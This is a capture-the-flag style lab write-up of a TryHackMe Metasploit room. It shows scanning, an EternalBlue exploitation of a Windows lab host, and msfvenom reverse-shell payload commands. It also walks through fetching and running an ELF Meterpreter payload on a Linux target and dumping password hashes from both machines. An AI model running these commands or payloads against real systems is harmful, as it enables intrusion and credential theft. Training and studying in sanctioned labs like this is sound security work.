---
title: Metasploit - Exploitation
desc: >-
  THM: Using Metasploit for scanning, vulnerability assessment and
  exploitation.
---
## Task 1 - Introduction

This room covers topics related to the use of Metasploit for vulnerability scanning and exploitation. The topics covered are as follows:

- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

## Task 2 - Scanning

In this task, scanning capabilities of Metasploit are covered.

### Port Scanning
Metasploit has a number of modules capable of scanning open ports on a target system and network. Potential port scanning modules can be listed using the `search portscan` command.

```console
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
```
We can also perfom an Nmap scan directly from the msfconsole prompt.

```console
msf6 > sudo nmap -sS 10.10.0.45
[*] exec: sudo nmap -sS 10.10.0.45

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:31 MST
Nmap scan report for 10.10.0.45
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
                                                           
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
```
### UDP Service Identification
The `scanner/discovery/udp_sweep` module allows us to quickly identify services running over UDP. This module does not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```console
msf6 auxiliary(scanner/discovery/udp_sweep) > show options

Module options (auxiliary/scanner/discovery/udp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                         /basics/using-metasploit.html
   THREADS    10               yes       The number of concurrent threads


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/discovery/udp_sweep) > set rhosts 10.10.0.45
rhosts => 10.10.0.45
msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.0.45->10.10.0.45 (1 hosts)
[*] Discovered NetBIOS on 10.10.0.45:137 (IP-10-10-0-45:<00>:U :IP-10-10-0-45:<03>:U :IP-10-10-0-45:<20>:U :__MSBROWSE__:<01>:G :ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1d>:U :ACME IT SUPPORT:<1e>:G :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### SMB Scans
Metasploit offers several auxiliary modules to scan services like SMB. SMB modules such as `smb_enumshares` and `smb_version` are particularly useful in a corporate network.

```console
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set rhost 10.10.0.45
rhost => 10.10.0.45
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.0.45:445        - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{312d7069-2d30-3031-2d30-2d3435000000}) (authentication domain:IP-10-10-0-45)
[*] 10.10.0.45:445        -   Host could not be identified: Windows 6.1 (Samba 4.7.6-Ubuntu)
[*] 10.10.0.45:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
***Side Note***: 
>NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

## Task 3 - The Metasploit Database
Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

We first need to start the PorstgreSQL database which Metasploit will then use.

```console
┌──(siachen㉿kali)-[~/CyberSec/THM/metasploit_exploitation]
└─$ sudo systemctl start postgresql         
                                                                                                                                                                
┌──(siachen㉿kali)-[~/CyberSec/THM/metasploit_exploitation]
└─$ sudo msfdb init                
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```
The status of the database can be checked within the `msfconsole`.

```console
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
The database feature allows the creation of workspaces to isolate different projects. When first launched, we will be in the default workspace. List of available workspaces can be checked using the `workspace` command.

```console
msf6 > workspace
* default
```
Workspaces can be added using `-a` parameter or deleted using the `-d` parameter.

```console
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf6 > workspace
  default
* tryhackme
```
The `*` indicates the selected (or active) workspace. To switch to a different workspace simply follow the `workspace` command with the name of the desired workspace.

```console
msf6 > workspace default
[*] Workspace: default
msf6 > workspace
  tryhackme
* default
```
The `workspace -h` command can be used to list all available options for the `workspace` command.

```console
msf6 > workspace -h
Usage:
    workspace          List workspaces
    workspace [name]   Switch workspace

OPTIONS:

    -a, --add <name>          Add a workspace.
    -d, --delete <name>       Delete a workspace.
    -D, --delete-all          Delete all workspaces.
    -h, --help                Help banner.
    -l, --list                List workspaces.
    -r, --rename <old> <new>  Rename a workspace.
    -S, --search <name>       Search for a workspace.
    -v, --list-verbose        List workspaces verbosely.
```
Once Metasploit is launched with a database, the `help` command will also show the Database Backend Command menu.

If we were to now urn an Nmap scan using the command `db_nmap`, all results will be saved to the database.

```console
msf6 > db_nmap -sV 10.10.207.51
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 16:06 MST
[*] Nmap: Nmap scan report for 10.10.207.51
[*] Nmap: Host is up (0.19s latency).
[*] Nmap: Not shown: 995 closed tcp ports (conn-refused)
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         ProFTPD 1.3.5e
[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 8000/tcp open  http        WebFS httpd 1.21
[*] Nmap: Service Info: Host: IP-10-10-207-51; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 50.45 seconds
```
Information relevant to hosts and services running on target systems can be checked with the `hosts` and `services` commands. The `hosts -h` and `services -h` commands will display their respective available options.

```console
msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.207.51             Unknown                    device

msf6 > services
Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
10.10.207.51  21    tcp    ftp          open   ProFTPD 1.3.5e
10.10.207.51  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.207.51  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.207.51  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.207.51  8000  tcp    http         open   WebFS httpd 1.21
```
Once the host information is stored in the database, we can use the `hosts -R` command to add this value to the RHOSTS parameter in modules. An example workflow is as follows:

1. Let's use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
2. Set the RHOSTS value using `hosts -R`.
3. Use `show options` to check if all values were assigned properly.
4. Launch the exploit using either `run` or `exploit`.

```console
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.207.51             Unknown                    device

RHOSTS => 10.10.207.51

msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                  Required  Description
   ----         ---------------                  --------  -----------
   CHECK_ARCH   true                             no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                             no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                            no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework  yes       List of named pipes to check
                /data/wordlists/named_pipes.txt
   RHOSTS       10.10.207.51                     yes       The target host(s), see https://docs.metasploit.com/doc
                                                           s/using-metasploit/basics/using-metasploit.html
   RPORT        445                              yes       The SMB service port (TCP)
   SMBDomain    .                                no        The Windows domain to use for authentication
   SMBPass                                       no        The password for the specified username
   SMBUser                                       no        The username to authenticate as
   THREADS      1                                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[-] 10.10.207.51:445      - Host does NOT appear vulnerable.
[*] 10.10.207.51:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Note that if there is more than one host saved in the database, all IP addresses will be used when the `hosts -R` command is used. In a typical penetration testing engagement, we could have to following scenario:
- Finding available hosts using the `db_nmap` command.
- Scanning these for further vulnerabilities or open ports (using a port scanning module).

The services command sued with the `-S` parameter will allow us to search for specific services in the environment.

```console
msf6 > services -S netbios
Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
10.10.207.51  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.207.51  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
```
Some low-hanging fruit to lookout for:
- HTTP: Could potentially host a web application where we can find vulnerabilities like SQL injection or RCE.
- FTP: Could allow anonymous login and provide access to interesting files.
- SMB: Could be vulnerable to SMB exploits like Eternal Blue (MS17-010).
- SSH: Could have default or easy to guess credentials.
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

## Task 4 - Vulnerability Scanning
Metasploit allows quick identification of critical vulnerabilities. Finding vulnerabilities using Metasploit relies heavily on our ability to scan and fingerprint targets.

For example, say during our enumeration we identify VNC service running on the target. We can use the `search VNC` function in Metasploit to list all modules related to VNC. These results will contain payloads and post modules. Using the `info` command, we can get more information on a desired module to get a better understanding of its use and purpose.

## Task 5 - Exploitation
Metasploit by nature is an exploitation framework. Exploits are the most populated module category.

Exploits can be searched using the `search` command. Like with modules, we can get more information about an exploit using the `info` command and launch the exploit using `run` or `exploit`.

Most exploits will have a preset default payload. We can always use the `show payloads` command to list other commands that can be used with that specific exploit.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   payload/generic/custom                                               normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                                         normal  No     Interact with Established SSH Connection
   4   payload/windows/x64/custom/bind_ipv6_tcp                             normal  No     Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager
   5   payload/windows/x64/custom/bind_ipv6_tcp_uuid                        normal  No     Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager with UUID Support
   6   payload/windows/x64/custom/bind_named_pipe                           normal  No     Windows shellcode stage, Windows x64 Bind Named Pipe Stager
   7   payload/windows/x64/custom/bind_tcp                                  normal  No     Windows shellcode stage, Windows x64 Bind TCP Stager
   8   payload/windows/x64/custom/bind_tcp_rc4                              normal  No     Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   9   payload/windows/x64/custom/bind_tcp_uuid                             normal  No     Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x64)
   10  payload/windows/x64/custom/reverse_http                              normal  No     Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)

...

```
Once we have decided on the payload, the `set payload` command can be used to use the payload.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
```
Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (ie: payload/python/shell_reverse_tcp).

Once a session has been opened, we can background it using `CTRL+Z` or abort it using `CTRL+C`. Backgrounding a session will be useful when working with more than one target or on the same target with a different exploit and/or shell.

```console
[*] Command shell session 1 opened (10.13.17.49:4444 -> 10.10.6.163:49174) at 2023-03-03 17:17:57 -0700


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
### Working with Sessions
The `sessions` command will list all active sessions. The `sessions` command supports a number of options which can be displayed using the `-h` parameter.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -c, --command <command>              Run a command on the session given with -i, or all
    -C, --meterpreter-command <command>  Run a Meterpreter Command on the session given with -i, or all
    -d, --list-inactive                  List all inactive sessions
    -h, --help                           Help banner
    -i, --interact <id>                  Interact with the supplied session ID
    -k, --kill <id>                      Terminate sessions by session ID and/or range
    -K, --kill-all                       Terminate all sessions
    -l, --list                           List all active sessions
    -n, --name <id> <name>               Name or rename a session by ID
    -q, --quiet                          Quiet mode
    -s, --script <script>                Run a script or module on the session given with -i, or all
    -S, --search <filter>                Row search filter.
    -t, --timeout <seconds>              Set a response timeout (default: 15)
    -u, --upgrade <id>                   Upgrade a shell to a meterpreter session on many platforms
    -v, --list-verbose                   List all active sessions in verbose mode
    -x, --list-extended                  Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```
We can interact with any existing session using the `sessions -i` command followed by the session ID.

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                               Connection
  --  ----  ----               -----------                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.13.17.49:4444 -> 10.10.6.163:49174 (10
                                6.1.7601] -----                          .10.6.163)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
C:\Windows\system32>search flag.txt
search flag.txt
'search' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>dir "\*flag.txt*" /s
dir "\*flag.txt*" /s
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

07/14/2021  08:39 PM                15 flag.txt
               1 File(s)             15 bytes

^C
Abort session 1? [y/N]  n

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

     Total Files Listed:
               1 File(s)             15 bytes
               0 Dir(s)  39,937,695,744 bytes free

C:\Windows\system32>dir "\*flag.txt*" /s
dir "\*flag.txt*" /s
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

07/14/2021  08:39 PM                15 flag.txt
               1 File(s)             15 bytes

C:\Windows\system32>cd C:\Users\Jon\Documents
cd C:\Users\Jon\Documents

C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

07/14/2021  08:39 PM    <DIR>          .
07/14/2021  08:39 PM    <DIR>          ..
07/14/2021  08:39 PM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  39,937,695,744 bytes free

C:\Users\Jon\Documents>type flag.txt
type flag.txt
THM-5455554845

C:\Windows\system32>^Z
Background session 2? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                               Connection
  --  ----  ----               -----------                               ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.13.17.49:4444 -> 10.10.6.163:49187 (10
                                6.1.7601] -----                          .10.6.163)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.13.17.49:4433 
[*] Sending stage (200774 bytes) to 10.10.6.163
msf6 post(windows/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.13.17.49:4444 -> 10.10.6.163:49187
                                     ion 6.1.7601] -----                    (10.10.6.163)
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC           10.13.17.49:4433 -> 10.10.6.163:49198
                                                                            (10.10.6.163)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```
## Task 6 - Msfvenom
Msfvenom allows the generation of payloads available in the Metasploit framework. The payloads can be created in many different formats (PHP, exe, dll, elf, etc.) and for many diferent target systems (Apple, Windows, Android, Linux, etc.).

```console
┌──(siachen㉿kali)-[~/CyberSec/THM/metasploit_exploitation]
└─$ msfvenom -l payloads

Framework Payloads (968 total) [--payload <value>]
==================================================

    Name                                                    Description
    ----                                                    -----------
    aix/ppc/shell_bind_tcp                                  Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                                 Spawn a shell on an established connection
    aix/ppc/shell_interact                                  Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                               Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                        Run a meterpreter server in Android. Tunnel communicat
                                                            ion over HTTP
    android/meterpreter/reverse_https                       Run a meterpreter server in Android. Tunnel communicat
                                                            ion over HTTPS
    android/meterpreter/reverse_tcp                         Run a meterpreter server in Android. Connect back stag
                                                            er
    android/meterpreter_reverse_http                        Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                       Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                         Connect back to the attacker and spawn a Meterpreter s
                                                            hell
    android/shell/reverse_http                              Spawn a piped command shell (sh). Tunnel communication
                                                             over HTTP
    android/shell/reverse_https                             Spawn a piped command shell (sh). Tunnel communication
                                                             over HTTPS
    android/shell/reverse_tcp                               Spawn a piped command shell (sh). Connect back stager
    apple_ios/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless
                                                            )
    apple_ios/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless
                                                            )
    apple_ios/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless
                                                            )

...

```
### Output Formats
We can either generate stand-alone payloads (ie: a Windows executable for Meterpreter) or get a useable raw format (ie: Python). The `msfvenom --list formats` command can be used to list supported output formats.

### Encoders
The aim of encoders is not to bypass anti-virus on the target system but to encode the payload itself. While encoding can have limited success against some anti-virus softwares, using modern obfuscation techniques or learning methods to inject shellcode is better solution to the problem. The command `msfvenom --list encoders` lists all available encoding scheme for the payload.

### Handlers
Similar to exploits using reverse shell, we will need to be able to accept incoming connections generated by the msfvenom payload. When using an exploit module through msfconsole, this part is automatically handled via the `payload options`. The term commonly used to receive a connection from a target is 'catching a shell'.

Reverse shells or Meterpreter callbacks generated in msfvenom payloads can be caught using a handler. In msfconsole we can use the `use exploit/multi/handler` to receive the incoming connection. Make sure to set the appropriate payload using `set payload` command.

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lhost 10.13.17.49
lhost => 10.13.17.49
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.17.49:4444
```
When the reverse shell is triggered by the target, the connection will be received by the multi/handler and provide us with a shell.

### Other Payloads
Based on the target system's configuration, msfvenom can be used to create payloads in almost all formats. Below are a few examples:

- Linux Executable and Linkable Format (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- Windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

### Practical Example
Connect to target via SSH (Credentials provided: murphy:1q2w3e4r)

```console
┌──(siachen㉿kali)-[~]
└─$ ssh murphy@10.10.240.70
murphy@10.10.240.70's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Mar  4 01:24:06 UTC 2023

  System load:  0.0               Processes:           91
  Usage of /:   4.0% of 29.02GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.240.70
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Mar  4 01:22:51 2023 from 10.13.17.49
Could not chdir to home directory /home/murphy: No such file or directory
$ 
```
Create a Meterpreter payload in .elf format.

Attacker Machine:
```console
──(siachen㉿kali)-[~/Downloads]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.13.17.49 LPORT=4444 -f elf > rev_shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
                                                                                                                    
┌──(siachen㉿kali)-[~/Downloads]
└─$ ls
rev_shell.elf
```
Start a Python3 HTTP server to serve the file to the target.

Attacker Machine:
```console
┌──(siachen㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
From the SSH connection on target, download the payload.

Target Machine:
```console
$ wget 10.13.17.49:8000/rev_shell.elf
--2023-03-04 01:28:57--  http://10.13.17.49:8000/rev_shell.elf
Connecting to 10.13.17.49:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: ‘rev_shell.elf’

rev_shell.elf                100%[==============================================>]     207  --.-KB/s    in 0.01s   

2023-03-04 01:28:57 (17.2 KB/s) - ‘rev_shell.elf’ saved [207/207]

$ ls
rev_shell.elf
$ 
```
Start our multi/handler in msfconsole.

Attacker Machine:
```console
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.13.17.49
lhost => 10.13.17.49

msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.13.17.49      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.17.49:4444
```
Execute the payload. We need to get root access through `sudo su` in order to be able to read the `/etc/shadow` file.

Target Machine:
```console
$ sudo su
[sudo] password for murphy: 
root@ip-10-10-240-70:/dev/shm# chmod +x rev_shell.elf
root@ip-10-10-240-70:/dev/shm# ls -l
total 4
-rwxrwxr-x 1 murphy murphy 207 Mar  4 01:35 rev_shell.elf
root@ip-10-10-240-70:/dev/shm# ./rev_shell.elf
```
Attacker Machine:
```console
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                             Connection
  --  ----  ----                   -----------                             ----------
  1         meterpreter x86/linux  murphy @ ip-10-10-240-70.eu-west-1.com  10.13.17.49:4444 -> 10.10.240.70:35302
                                   pute.internal                           (10.10.240.70)

```
Use `post/linux/gather/hashdump` module to dump the user's password hash.

Attacker Machine:
```console
msf6 exploit(multi/handler) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/hashdump) > set session 1
session => 1
msf6 post(linux/gather/hashdump) > run

[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /home/siachen/.msf4/loot/20230303190258_default_10.10.240.70_linux.hashes_398504.txt
[*] Post module execution completed
```